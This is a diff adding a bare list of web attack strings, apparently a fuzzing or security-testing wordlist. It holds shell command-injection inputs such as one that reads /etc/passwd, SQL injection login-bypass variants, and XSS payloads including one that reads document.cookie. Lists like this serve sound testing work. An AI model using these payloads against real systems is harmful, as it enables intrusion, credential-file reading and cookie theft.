@@ -1,0 +1,44 @@
+; ls
+&& cat /etc/passwd
+| whoami
+&& sleep 10
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1' /*
+' OR '1'='1' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR 1=1 OR '1'='1
+" OR "1"="1
+" OR "1"="1"--
+" OR "1"="1"#
+" OR "1"="1" /*
+" OR "1"="1" OR "1"="1
+" OR 1=1--
+" OR 1=1#
+" OR 1=1/*
+" OR 1=1 OR "1"="1
+') OR ('1'='1
+') OR ('1'='1'--
+') OR ('1'='1'#
+') OR ('1'='1' /*
+') OR ('1'='1')--
+') OR ('1'='1')#
+') OR ('1'='1')/*
+') OR (1=1
+') OR (1=1)--
+') OR (1=1)#
+') OR (1=1)/*
+') OR (1=1 OR '1'='1
+") OR ("1"="1
+") OR ("1"="1"-- 
+") OR ("1"="1"# 
+") OR ("1"="1" /* 
+") OR ("1"="1" OR "1"="1
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<img src="x" onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+<body onload="alert('XSS')">
